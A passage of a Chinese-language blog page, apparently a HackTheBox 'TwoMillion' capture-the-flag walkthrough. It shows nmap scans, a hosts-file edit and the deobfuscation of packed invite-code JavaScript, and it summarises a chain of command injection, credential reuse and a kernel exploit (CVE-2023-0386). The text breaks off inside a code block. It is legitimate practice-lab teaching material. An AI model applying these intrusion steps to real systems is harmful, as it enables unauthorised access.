@@ -1,0 +1,1600 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="TwoMillion About: TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox. The box features an old version of the HackTheBox platform that includes the old hackable invite code. After hacking the invite code an account can be created on the platform. The account can be used to enumerate various API endpoints, one of which can be used to elevate the user">
+<title>15. TwoMillion</title>
+
+<link rel='canonical' href='https://Sp1ke-sec.github.io/p/15.-twomillion/'>
+
+<link rel="stylesheet" href="/scss/style.min.3dc2b87862416cdfa498393fe10f71a7856c63450472efbab1e94150643be501.css"><meta property='og:title' content="15. TwoMillion">
+<meta property='og:description' content="TwoMillion About: TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox. The box features an old version of the HackTheBox platform that includes the old hackable invite code. After hacking the invite code an account can be created on the platform. The account can be used to enumerate various API endpoints, one of which can be used to elevate the user">
+<meta property='og:url' content='https://Sp1ke-sec.github.io/p/15.-twomillion/'>
+<meta property='og:site_name' content='Sp1ke-sec 安全博客'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-11-09T14:43:21&#43;08:00'/><meta property='article:modified_time' content='2026-11-09T14:43:21&#43;08:00'/><meta property='og:image' content='https://Sp1ke-sec.github.io/p/15.-twomillion/assets/image-20261109110807877.png' />
+<meta name="twitter:title" content="15. TwoMillion">
+<meta name="twitter:description" content="TwoMillion About: TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox. The box features an old version of the HackTheBox platform that includes the old hackable invite code. After hacking the invite code an account can be created on the platform. The account can be used to enumerate various API endpoints, one of which can be used to elevate the user"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://Sp1ke-sec.github.io/p/15.-twomillion/assets/image-20261109110807877.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu1489495842607495246.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🚭</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Sp1ke-sec 安全博客</a></h1>
+            <h2 class="site-description">这里是 Sp1ke-sec</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Sp1ke-sec'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#task-1">Task 1</a></li>
+        <li><a href="#task-2">Task 2</a></li>
+        <li><a href="#task-3">Task 3</a></li>
+        <li><a href="#task-4">Task 4</a></li>
+        <li><a href="#task-5">Task 5</a></li>
+        <li><a href="#task-6">Task 6</a></li>
+        <li><a href="#task-7">Task 7</a></li>
+        <li><a href="#task-8">Task 8</a></li>
+        <li><a href="#task-9">Task 9</a></li>
+        <li><a href="#submit-user-flag">Submit User Flag</a></li>
+        <li><a href="#task-11">Task 11</a></li>
+        <li><a href="#task-12">Task 12</a></li>
+        <li><a href="#submit-root-flag">Submit Root Flag</a></li>
+        <li><a href="#task-14">Task 14</a></li>
+        <li><a href="#task-15">Task 15</a></li>
+        <li><a href="#task-16">Task 16</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/15.-twomillion/">
+                <img src="/p/15.-twomillion/assets/image-20261109110807877_hu10259082412440918601.png"
+                        srcset="/p/15.-twomillion/assets/image-20261109110807877_hu10259082412440918601.png 800w, /p/15.-twomillion/assets/image-20261109110807877_hu12335311337950568592.png 1600w"
+                        width="800" 
+                        height="353" 
+                        loading="lazy"
+                        alt="Featured image of post 15. TwoMillion" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/htb/" style="background-color: #2a9d8f; color: #fff;">
+                HTB
+            </a>
+        
+            <a href="/categories/easy/" >
+                Easy
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/15.-twomillion/">15. TwoMillion</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-11-09</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 10 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="twomillion">TwoMillion
+</h1><p><img src="/p/15.-twomillion/assets/image-20261109110807877.png"
+	width="431"
+	height="190"
+	srcset="/p/15.-twomillion/assets/image-20261109110807877_hu2047848916977304026.png 480w, /p/15.-twomillion/assets/image-20261109110807877_hu2217890898369605720.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261109110807877"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="226"
+		data-flex-basis="544px"
+	
+></p>
+<p>About: TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox. The box features an old version of the HackTheBox platform that includes the old hackable invite code. After hacking the invite code an account can be created on the platform. The account can be used to enumerate various API endpoints, one of which can be used to elevate the user to an Administrator. With administrative access the user can perform a command injection in the admin VPN generation endpoint thus gaining a system shell. An .env file is found to contain database credentials and owed to password re-use the attackers can login as user admin on the box. The system kernel is found to be outdated and CVE-2023-0386 can be used to gain a root shell.</p>
+<p>介绍：TwoMillion 是一个简单难度的 Linux 靶机，是为了庆祝 HackTheBox 用户达到 200 万而发布的。盒子里装有一个旧版本的 HackTheBox 平台，其中包含旧的可破解邀请码。破解邀请码后，即可在该平台上创建帐户。该帐户可用于枚举各种 API 端点，其中一个端点可用于将用户提升为管理员。拥有管理员权限的用户可以在管理员 VPN 生成端点执行命令注入，从而获得系统 shell。发现 .env 文件包含数据库凭据，由于密码重用，攻击者可以以管理员用户身份登录到该主机。发现系统内核已过时，CVE-2023-0386 可用于获取 root shell。</p>
+<p>靶机 IP：10.129.229.66</p>
+<h3 id="task-1">Task 1
+</h3><blockquote>
+<p>How many TCP ports are open?</p>
+<p>有多少个TCP端口处于开放状态？</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/TwoMillion<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -Pn 10.129.229.66               
+</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-11-08 22:12 -0500
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.229.66 <span class="o">(</span>10.129.229.66<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.14s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
+</span></span><span class="line"><span class="cl">22/tcp open  ssh
+</span></span><span class="line"><span class="cl">80/tcp open  http
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 2.08 seconds
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/TwoMillion<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -Pn -p 22,80 -sV -sC 10.129.229.66
+</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-11-08 22:20 -0500
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.229.66 <span class="o">(</span>10.129.229.66<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.13s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    nginx
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://2million.htb/
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 12.45 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：2</strong></p>
+<h3 id="task-2">Task 2
+</h3><blockquote>
+<p>What is the name of the JavaScript file loaded by the <code>/invite</code> page that has to do with invite codes?</p>
+<p>/invite 页面加载的与邀请码相关的 JavaScript 文件名是什么？</p>
+</blockquote>
+<p>访问 <code>http://10.129.229.66</code> 会重定向到 <code>http://2million.htb/</code>。</p>
+<p>在 kali 中修改 <code>/etc/hosts</code> 文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;10.129.229.66 2million.htb&#34;</span> &gt;&gt; /etc/hosts
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这时就可成功访问。</p>
+<p><img src="/p/15.-twomillion/assets/image-20261109112715705.png"
+	width="2402"
+	height="794"
+	srcset="/p/15.-twomillion/assets/image-20261109112715705_hu12363206704010653516.png 480w, /p/15.-twomillion/assets/image-20261109112715705_hu7892637832330214051.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261109112715705"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="302"
+		data-flex-basis="726px"
+	
+></p>
+<p><img src="/p/15.-twomillion/assets/image-20261109112918634.png"
+	width="1852"
+	height="483"
+	srcset="/p/15.-twomillion/assets/image-20261109112918634_hu12548659734728548554.png 480w, /p/15.-twomillion/assets/image-20261109112918634_hu2967512540005160618.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261109112918634"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="383"
+		data-flex-basis="920px"
+	
+></p>
+<p><strong>答案：inviteapi.min.js</strong></p>
+<h3 id="task-3">Task 3
+</h3><blockquote>
+<p>What JavaScript function on the invite page returns the first hint about how to get an invite code? Don&rsquo;t include () in the answer.</p>
+<p>邀请页面上的哪个 JavaScript 函数会返回有关如何获取邀请码的第一个提示？答案中不要包含括号 ()。</p>
+</blockquote>
+<p>我们查看 inviteapi.min.js 的代码，发现是被混淆之后的。混淆方法叫 p.a.c.k.e.r 混淆。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nb">eval</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">p</span><span class="p">,</span><span class="nx">a</span><span class="p">,</span><span class="nx">c</span><span class="p">,</span><span class="nx">k</span><span class="p">,</span><span class="nx">e</span><span class="p">,</span><span class="nx">d</span><span class="p">){</span><span class="nx">e</span><span class="o">=</span><span class="kd">function</span><span class="p">(</span><span class="nx">c</span><span class="p">){</span><span class="k">return</span> <span class="nx">c</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">36</span><span class="p">)};</span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="s1">&#39;&#39;</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/^/</span><span class="p">,</span><span class="nb">String</span><span class="p">)){</span><span class="k">while</span><span class="p">(</span><span class="nx">c</span><span class="o">--</span><span class="p">){</span><span class="nx">d</span><span class="p">[</span><span class="nx">c</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="nx">a</span><span class="p">)]</span><span class="o">=</span><span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span><span class="o">||</span><span class="nx">c</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="nx">a</span><span class="p">)}</span><span class="nx">k</span><span class="o">=</span><span class="p">[</span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span><span class="k">return</span> <span class="nx">d</span><span class="p">[</span><span class="nx">e</span><span class="p">]}];</span><span class="nx">e</span><span class="o">=</span><span class="kd">function</span><span class="p">(){</span><span class="k">return</span><span class="s1">&#39;\\w+&#39;</span><span class="p">};</span><span class="nx">c</span><span class="o">=</span><span class="mi">1</span><span class="p">};</span><span class="k">while</span><span class="p">(</span><span class="nx">c</span><span class="o">--</span><span class="p">){</span><span class="k">if</span><span class="p">(</span><span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">]){</span><span class="nx">p</span><span class="o">=</span><span class="nx">p</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="s1">&#39;\\b&#39;</span><span class="o">+</span><span class="nx">e</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;\\b&#39;</span><span class="p">,</span><span class="s1">&#39;g&#39;</span><span class="p">),</span><span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">])}}</span><span class="k">return</span> <span class="nx">p</span><span class="p">}(</span><span class="s1">&#39;1 i(4){h 8={&#34;4&#34;:4};$.9({a:&#34;7&#34;,5:&#34;6&#34;,g:8,b:\&#39;/d/e/n\&#39;,c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:&#34;7&#34;,5:&#34;6&#34;,b:\&#39;/d/e/k/l/m\&#39;,c:1(0){3.2(0)},f:1(0){3.2(0)}})}&#39;</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="s1">&#39;response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify&#39;</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">),</span><span class="mi">0</span><span class="p">,{}))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>代码让 eval 执行了还原出来的字符串，所以我们只要把 eval 换成 console.log 就能得到还原出来的代码。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// 浏览器控制台输入
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">p</span><span class="p">,</span><span class="nx">a</span><span class="p">,</span><span class="nx">c</span><span class="p">,</span><span class="nx">k</span><span class="p">,</span><span class="nx">e</span><span class="p">,</span><span class="nx">d</span><span class="p">){</span><span class="nx">e</span><span class="o">=</span><span class="kd">function</span><span class="p">(</span><span class="nx">c</span><span class="p">){</span><span class="k">return</span> <span class="nx">c</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">36</span><span class="p">)};</span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="s1">&#39;&#39;</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/^/</span><span class="p">,</span><span class="nb">String</span><span class="p">)){</span><span class="k">while</span><span class="p">(</span><span class="nx">c</span><span class="o">--</span><span class="p">){</span><span class="nx">d</span><span class="p">[</span><span class="nx">c</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="nx">a</span><span class="p">)]</span><span class="o">=</span><span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span><span class="o">||</span><span class="nx">c</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="nx">a</span><span class="p">)}</span><span class="nx">k</span><span class="o">=</span><span class="p">[</span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span><span class="k">return</span> <span class="nx">d</span><span class="p">[</span><span class="nx">e</span><span class="p">]}];</span><span class="nx">e</span><span class="o">=</span><span class="kd">function</span><span class="p">(){</span><span class="k">return</span><span class="s1">&#39;\\w+&#39;</span><span class="p">};</span><span class="nx">c</span><span class="o">=</span><span class="mi">1</span><span class="p">};</span><span class="k">while</span><span class="p">(</span><span class="nx">c</span><span class="o">--</span><span class="p">){</span><span class="k">if</span><span class="p">(</span><span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">]){</span><span class="nx">p</span><span class="o">=</span><span class="nx">p</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="s1">&#39;\\b&#39;</span><span class="o">+</span><span class="nx">e</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;\\b&#39;</span><span class="p">,</span><span class="s1">&#39;g&#39;</span><span class="p">),</span><span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">])}}</span><span class="k">return</span> <span class="nx">p</span><span class="p">}(</span><span class="s1">&#39;1 i(4){h 8={&#34;4&#34;:4};$.9({a:&#34;7&#34;,5:&#34;6&#34;,g:8,b:\&#39;/d/e/n\&#39;,c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:&#34;7&#34;,5:&#34;6&#34;,b:\&#39;/d/e/k/l/m\&#39;,c:1(0){3.2(0)},f:1(0){3.2(0)}})}&#39;</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="s1">&#39;response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify&#39;</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">),</span><span class="mi">0</span><span class="p">,{}))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 还原后的代码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nx">verifyInviteCode</span><span class="p">(</span><span class="nx">code</span><span class="p">){</span><span class="kd">var</span> <span class="nx">formData</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;code&#34;</span><span class="o">:</span><span class="nx">code</span><span class="p">};</span><span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span><span class="nx">type</span><span class="o">:</span><span class="s2">&#34;POST&#34;</span><span class="p">,</span><span class="nx">dataType</span><span class="o">:</span><span class="s2">&#34;json&#34;</span><span class="p">,</span><span class="nx">data</span><span class="o">:</span><span class="nx">formData</span><span class="p">,</span><span class="nx">url</span><span class="o">:</span><span class="s1">&#39;/api/v1/invite/verify&#39;</span><span class="p">,</span><span class="nx">success</span><span class="o">:</span><span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">){</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">response</span><span class="p">)},</span><span class="nx">error</span><span class="o">:</span><span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">){</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span 